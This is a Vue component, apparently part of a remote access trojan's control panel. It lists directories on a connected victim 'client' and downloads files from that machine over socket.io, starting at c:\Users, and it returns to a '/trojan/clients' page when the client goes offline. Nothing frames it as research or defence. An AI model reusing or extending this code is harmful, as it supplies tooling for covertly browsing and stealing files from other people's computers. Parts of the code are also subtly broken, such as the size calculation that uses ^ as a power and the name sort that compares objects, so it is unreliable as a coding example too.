<template>
  <div>
    <div>
      <div id="fileControlGroup">
        <p>ID: {{ id }}</p>
        <p style="color: green">当前路径: {{ currentUrl }}</p>
        <input
          v-model="currentUrl"
          style="width: 60vw"
          @keydown.enter="openDir(currentUrl)"
        />
        <button @click="openDir(currentUrl)">读取目录</button>
        <button @click="goBack">返回</button>
        <div id="file-button" v-if="selectedFile && !selectedFile.isDir">
          <button @click="download(selectedFile.name)">下载选择文件</button>
          <button>显示选择文件内容</button>
        </div>
      </div>
      <div class="fileGroup">
        <div class="fileLstat" style="position: absolute">
          <div class="fileName" @click="switchSort('文件名')">
            文件名<i
              class="fa fa-angle-up"
              v-if="calSortShow('文件名', '降序')"
            ></i
            ><i
              class="fa fa-angle-down"
              v-if="calSortShow('文件名', '升序')"
            ></i>
          </div>
          <div class="fileInfo">
            <p class="fileInfo_ctime" @click="switchSort('时间')">
              修改时间<i
                class="fa fa-angle-up"
                v-if="calSortShow('时间', '降序')"
              ></i
              ><i
                class="fa fa-angle-down"
                v-if="calSortShow('时间', '升序')"
              ></i>
            </p>
            <p class="fileInfo_size" @click="switchSort('文件大小')">
              文件大小<i
                class="fa fa-angle-up"
                v-if="calSortShow('文件大小', '降序')"
              ></i
              ><i
                class="fa fa-angle-down"
                v-if="calSortShow('文件大小', '升序')"
              ></i>
            </p>
          </div>
        </div>
        <div class="filesWrapper" @dblclick="goBack" style="margin-top: 30px">
          <div class="fileName">
            <p>..\</p>
          </div>
        </div>

        <template v-for="(file, index) in sortedFileList" :key="index">
          <div
            class="filesWrapper"
            :class="isSelected(file)"
            @contextmenu="showFileContextMenu(file.name)"
            @click="selectFile(fileList[index])"
            @dblclick="openDir(file.name)"
          >
            <div class="fileName">
              <p>
                <i
                  :class="getExtCssObj(file.name).class"
                  :style="getExtCssObj(file.name).style"
                ></i>
                {{ file.name }}
              </p>
            </div>
            <div class="fileInfo">
              <p class="fileInfo_ctime" v-if="file.lstat.ctime">
                {{ new Date(file.lstat.mtime).toLocaleString() }}
              </p>
              <p class="fileInfo_size" v-if="file.lstat.size">
                {{ calcFileSize(file) }}
              </p>
            </div>
          </div>
        </template>
      </div>
    </div>
    <context-menu
      :contextMenu="$store.state.contextMenu"
      :msg="msg"
      :template="contextMenu.template"
    ></context-menu>
  </div>
</template>

<script>
// const path = window.require("path");
// import path from "path";
// const { ipcRenderer } = window.require("electron");
// const fs = window.require("fs");
import path from "path-win32";
import ContextMenuVue from "../../components/ContextMenu";
import { SERVER_ADDRESS } from "../../../my_config";
import EXT from "./ext.js";

class util {}
util.IdIndex = function (id) {
  for (let i = 0; i < window.clientArr.length; i++) {
    if (window.clientArr[i].id === id) {
      return i;
    }
  }
  return -1;
};

export default {
  data() {
    return {
      id: "",
      currentUrl: "c:\\Users",
      fileList: [],
      sortedFileList: [],
      selectedFile: null,
      msg: {},
      sortedBy: {
        name: "文件名",
        type: "降序",
      },
      contextMenu: {
        template: [
          {
            label: "下载此文件",
            click: () => {
              // event.reply("downloadfile", msg.id, fileUrl);
            },
          },
          {
            label: "显示此文件内容",
            click: () => {
              // event.reply("showfilecontent", fileUrl);
            },
          },
          // { type: "separator" },

          // { label: "Menu Item 2", type: "checkbox", checked: true },
        ],
      },
    };
  },
  watch: {
    fileList(nv, ov) {
      this.sortFileList();
    },
    sortedBy: {
      handler(nv, ov) {
        this.sortFileList();
      },
      deep: true,
    },
  },
  computed: {
    // sortedFileList() {
    //   switch (this.sortedBy) {
    //     case "文件名": {
    //       return this.fileList.sort();
    //     }
    //   }
    //   return this.fileList;
    // },
    isDir() {
      return function (is_dir) {
        return is_dir ? { color: "red" } : {};
      };
    },
    isSelected() {
      const that = this;
      return function (file) {
        let classList = [];
        if (file == that.selectedFile) {
          classList.push("file-selected");
        }
        // if (file.isDir) {
        //   classList.push("file-is-dir");
        // }
        return classList;
      };
    },
    getExtCssObj() {
      return function (file) {
        const extName = path.extname(file);
        return EXT.calcClass(extName);
      };
    },
    calSortShow() {
      let that = this;
      return (name, type) => {
        return name == this.sortedBy.name && type == this.sortedBy.type
          ? true
          : false;
      };
    },
  },
  beforeMount() {
    let that = this;
    this.$nextTick(() => {
      this.openDir(".");
    });
    // ipcRenderer.on("downloadfile", (e, id, fileUrl) => {
    //   that.download(fileUrl);
    // });
    // ipcRenderer.on("showfilecontent", (e, fileUrl) => {});
    window.io.on("apilistdir", (result, url) => {
      // console.log(result);
      if (result.length) {
        // console.log(result);
        that.fileList = result;
        that.sortedFileList = that.fileList;
        that.currentUrl = url;
      }
    });
    // window.ss(window.io).on("apidownloadfile", (stream) => {
    //   console.log(stream);
    //   console.log(666);
    //   // stream.pipe(fs.createWriteStream("C:\\ProgramData\\nssm\\testbili123"));
    // });
    window.io.on("apidownloadfile", (fileName) => {
      window.open(`${SERVER_ADDRESS}:7071/tmpDir/${fileName}`);
    });
    window.io.on("apishowfilecontent", (raw) => {});
    this.id = this.$route.query.id;

    this.interval = setInterval(() => {
      if (util.IdIndex(this.id) == -1) {
        clearInterval(this.interval);
        // alert("此客户端已离线");
        this.$router.push("/trojan/clients");
      }
    }, 200);

    this.sortFileList();
  },
  methods: {
    switchSort(name) {
      if (this.sortedBy.name == name) {
        if (this.sortedBy.type == "升序") {
          this.sortedBy.type = "降序";
        } else if (this.sortedBy.type == "降序") {
          this.sortedBy.type = "升序";
        }
      } else {
        this.sortedBy = {
          name: name,
          type: "升序",
        };
      }
      console.log(this.sortedBy);
    },
    sortFileList() {
      switch (this.sortedBy.name) {
        case "文件名": {
          switch (this.sortedBy.type) {
            case "升序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a > b) {
                  return 1;
                } else {
                  return -1;
                }
              });
              break;
            }
            case "降序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a < b) {
                  return 1;
                } else {
                  return -1;
                }
              });
              break;
            }
          }
          break;
        }
        case "时间": {
          switch (this.sortedBy.type) {
            case "升序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a.lstat.mtime > b.lstat.mtime) {
                  return -1;
                } else {
                  return 1;
                }
              });
              break;
            }
            case "降序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a.lstat.mtime < b.lstat.mtime) {
                  return -1;
                } else {
                  return 1;
                }
              });
              break;
            }
          }

          break;
        }
        case "文件大小": {
          switch (this.sortedBy.type) {
            case "升序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a.lstat.size > b.lstat.size) {
                  return -1;
                } else {
                  return 1;
                }
              });
              break;
            }
            case "降序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a.lstat.size < b.lstat.size) {
                  return -1;
                } else {
                  return 1;
                }
              });
              break;
            }
          }

          break;
        }
      }
    },
    selectFile(file) {
      if (this.selectedFile == file) {
        this.selectedFile = null;
        return;
      }
      this.selectedFile = file;
    },
    calcFileSize(file) {
      let size = file.lstat.size;

      if (file.isDir) {
        return null;
      }

      if (size < (1024 ^ 1)) {
        return size.toFixed(2) + "B";
      } else if (size < (1024 ^ 2) * 1000) {
        return (size / 1024).toFixed(2) + "KB";
      } else if (size < (1024 ^ 3) * 1000 * 1000) {
        return (size / 1024 / 1024).toFixed(2) + "MB";
      } else if (size < (1024 ^ 4) * 1000 * 1000 * 1000) {
        return (size / 1024 / 1024 / 1024).toFixed(2) + "GB";
      }
    },
    showFileContextMenu(fileName) {
      let toUrl = path.resolve(this.currentUrl, fileName);
      // ipcRenderer.send("file-context-menu", { id: this.id }, toUrl);
    },
    goBack() {
      this.currentUrl = path.resolve(this.currentUrl, "..");
      window.io.emit("apilistdir", this.id, this.currentUrl);
    },
    openDir(target) {
      let toUrl = path.resolve(this.currentUrl, target);
      // console.log(toUrl);
      window.io.emit("apilistdir", this.id, toUrl);
    },
    download(target) {
      let that = this;
      const fileUrl = path.resolve(this.currentUrl, target);
      window.io.emit("apidownloadfile", that.id, fileUrl);
    },
    showFileContent(target) {
      window.io.emit("apishowfilecontent", this.id, target);
    },
    showDetails() {},
  },
  components: {
    "context-menu": ContextMenuVue,
  },
};
</script>

<style lang="less">
.fileLstat {
  .fileGroup.filesWrapper();
  * {
    cursor: pointer;
    user-select: none;
  }
  // border-bottom: 2px solid green;
  border-bottom: 1.2px solid black;
  background-color: gainsboro;
  z-index: 999;
  padding: 5px 0;
  border-bottom-left-radius: 5px;
  border-bottom-right-radius: 5px;
}
.file-is-dir {
  color: red;
}
.file-selected {
  background-color: rgb(209, 209, 209);
  border-bottom: 3px rgb(6, 90, 158) solid !important;
}
#file-button {
  margin-left: 5px;
  display: inline;
}
.fileGroup {
  margin-top: 10px;
  .filesWrapper {
    // display: flex;
    // flex-direction: row;
    // justify-content: space-between;
    // align-items: space-between;
    // flex-grow: 1;
    padding: 2vh 0 2vh 0;
    width: 90%;
    display: grid;
    grid-template-rows: repeat(auto-fill);
    grid-template-columns: 1fr 1fr;
    border-bottom: 1px rgb(153, 153, 153) solid;
    &:hover {
      border-bottom: 1.2px solid black;
    }
  }
  .fileName {
    // width: 40%;
    display: flex;
    flex-direction: row;
    justify-content: flex-start;
    @media screen {
    }
    text-align: left;
    word-break: break-all;
    padding-right: 3vw;
  }
  .fileInfo {
    font-size: 0.7rem;
    display: flex;
    flex-direction: row;
    justify-content: space-between;
    .fileInfo_size {
    }
  }
  // box-sizing: border-box;
  height: 52vh;
  display: flex;
  flex-direction: column;
  flex-wrap: nowrap;
  overflow: scroll;
  // padding: 30px;
  align-items: center;
  width: 100%;
  // p {
  //   // box-sizing: border-box;
  //   width: 100%;
  //   text-align: left;
  //   margin: 5px 0 5px 10%;
  //   padding: 10px 5% 10px 5%;
  //   // margin: 0 auto;
  //   user-select: none;
  //   // white-space: nowrap;
  //   flex-grow: 0;
  //   flex-shrink: 1;
  //   margin-top: 3px;
  //   cursor: pointer;
  //   // overflow: hidden;
  //   // text-overflow: ellipsis;
  //   // border-top: 1px rgb(153, 153, 153) solid;

  //   // height: 5vh;
  //   &:hover {
  //     // width: auto;
  //     overflow: visible;
  //     text-overflow: inherit;
  //     // background-color: lightcoral;
  //     // font-size: 1.1rem;
  //     // transform: scale(1.05);
  //     // transform-origin: left top;
  //     z-index: 999;
  //     // width: 30vw;
  //     // box-shadow: 0.5px 0 2px 1px black;
  //     // border-top: 1.2px solid black;
  //   }
  //   i {
  //     margin-right: 10px;
  //   }
  // }
}
</style>
